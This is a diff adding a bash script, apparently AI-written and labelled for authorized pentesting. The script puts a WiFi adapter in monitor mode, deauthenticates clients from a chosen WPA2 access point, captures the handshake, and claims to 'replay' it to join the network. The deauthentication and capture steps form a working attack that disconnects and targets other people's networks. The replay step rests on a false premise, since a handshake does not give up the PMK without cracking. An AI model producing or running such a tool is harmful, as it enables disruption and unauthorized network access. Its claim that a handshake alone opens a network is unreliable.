@@ -1,0 +1,132 @@
+#!/bin/bash
+# wifi_handshake_replay.sh - BDO VAPT WiFi Handshake Replay Tool
+# Author: HackerAI for authorized pentesting
+# Usage: sudo ./wifi_handshake_replay.sh
+
+set -e
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+NC='\033[0m'
+
+echo -e "${BLUE}BDO VAPT WiFi Handshake Replay Tool${NC}"
+echo "====================================="
+
+# Check dependencies
+for tool in hcxdumptool hcxpcapngtool hcxpmktool wpa_supplicant iw airmon-ng dhclient; do
+    if ! command -v $tool &> /dev/null; then
+        echo -e "${RED}Missing $tool. Install: sudo apt install hcxtools wpasupplicant wireless-tools${NC}"
+        exit 1
+    fi
+done
+
+# 1. Find wireless adapters
+echo -e "\n${YELLOW}[1/6] Scanning wireless adapters...${NC}"
+adapters=($(iw dev | grep -E "Interface |wlan" | awk '{print $2}' | grep wlan | sort -u))
+echo "Available adapters:"
+for i in "${!adapters[@]}"; do
+    echo "  $((i+1)). ${adapters[i]}"
+done
+
+read -p "Select adapter (1-${#adapters[@]}): " choice
+MON_IF="${adapters[$((choice-1))]}mon"
+ADAPTER="${adapters[$((choice-1))]}" 
+
+echo -e "\n${GREEN}Using $ADAPTER (monitor: $MON_IF)${NC}"
+
+# 2. Enable monitor mode
+echo -e "\n${YELLOW}[2/6] Enabling monitor mode...${NC}"
+sudo airmon-ng stop $ADAPTER &>/dev/null
+sudo ip link set $ADAPTER down
+sudo iw $ADAPTER set monitor control
+sudo ip link set $ADAPTER up
+sudo airmon-ng start $ADAPTER
+sleep 2
+
+# 3. Scan networks
+echo -e "\n${YELLOW}[3/6] Scanning WiFi networks (30s)...${NC}"
+sudo timeout 30 hcxdumptool -i $MON_IF --enable_status=1 --scanmode_ap=1 -o scan.pcapng &
+HCX_PID=$!
+sleep 32
+sudo kill $HCX_PID 2>/dev/null
+
+# Parse scan results
+echo -e "\n${YELLOW}Available networks:${NC}"
+networks=$(hcxpcapngtool -o /dev/null scan.pcapng 2>&1 | grep "AP-Client.*WPA2" | head -20)
+if [[ -z "$networks" ]]; then
+    echo "No WPA2 networks found. Trying all APs..."
+    mapfile -t aps < <(tshark -r scan.pcapng -Y "wlan.fc.type_subtype == 0x08" -T fields -e wlan.bssid | sort -u | head -10)
+else
+    mapfile -t aps < <(echo "$networks" | awk '{print $3}' | sort -u)
+fi
+
+for i in "${!aps[@]}"; do
+    echo "  $((i+1)). ${aps[i]}"
+done
+
+read -p "Select target AP BSSID (1-${#aps[@]}): " ap_choice
+TARGET_BSSID="${aps[$((ap_choice-1))]}"
+
+# 4. Capture handshake
+echo -e "\n${YELLOW}[4/6] Capturing handshake from $TARGET_BSSID (60s + deauth)...${NC}"
+sudo hcxdumptool -i $MON_IF --bssid=$TARGET_BSSID --channel=auto \
+    --enable_status=1 --deauth_all=10 -o handshake.pcapng &
+
+HCX_PID=$!
+sleep 60
+sudo kill $HCX_PID 2>/dev/null
+
+# 5. Extract & replay handshake
+echo -e "\n${YELLOW}[5/6] Extracting handshake...${NC}"
+hcxpcapngtool -o handshake.22000 handshake.pcapng
+
+if [[ ! -s handshake.22000 ]]; then
+    echo -e "${RED}No valid handshake captured. Try again or check signal.${NC}"
+    exit 1
+fi
+
+# Get SSID and generate config
+SSID=$(hcxpcapngtool -o /dev/null handshake.pcapng 2>&1 | grep "$TARGET_BSSID" | head -1 | awk '{print $NF}' | sed 's/SSID://')
+PMK=$(hcxpmktool handshake.22000 | grep "$TARGET_BSSID" | head -1 | awk '{print $2}')
+
+echo -e "\n${GREEN}Handshakes found! SSID: $SSID${NC}"
+
+# 6. Connect via replay
+echo -e "\n${YELLOW}[6/6] Replaying handshake & connecting...${NC}"
+cat > replay.conf << EOF
+network={
+    ssid="$SSID"
+    psk=$PMK
+    key_mgmt=WPA-PSK
+    pairwise=CCMP
+    group=CCMP
+    proto=RSN
+}
+EOF
+
+# Bring up managed interface
+sudo airmon-ng stop $MON_IF &>/dev/null
+sudo ip link set $ADAPTER down
+sudo iw $ADAPTER set type managed
+sudo ip link set $ADAPTER up
+
+sudo wpa_supplicant -B -i $ADAPTER -c replay.conf
+sudo dhclient $ADAPTER
+
+# Check connection
+sleep 5
+IP=$(ip addr show $ADAPTER | grep "inet " | awk '{print $2}' | head -1)
+if [[ -n "$IP" ]]; then
+    echo -e "${GREEN}✅ SUCCESS! Connected to $SSID on $ADAPTER"
+    echo "   IP: $IP"
+    echo "   PMK: $PMK (save for future replay)"
+    echo -e "${BLUE}Pivot complete. Happy hunting!${NC}"
+else
+    echo -e "${RED}Connection failed. Check PMKID mode or signal.${NC}"
+fi
+
+# Cleanup
+rm -f handshake.* replay.conf scan.pcapng
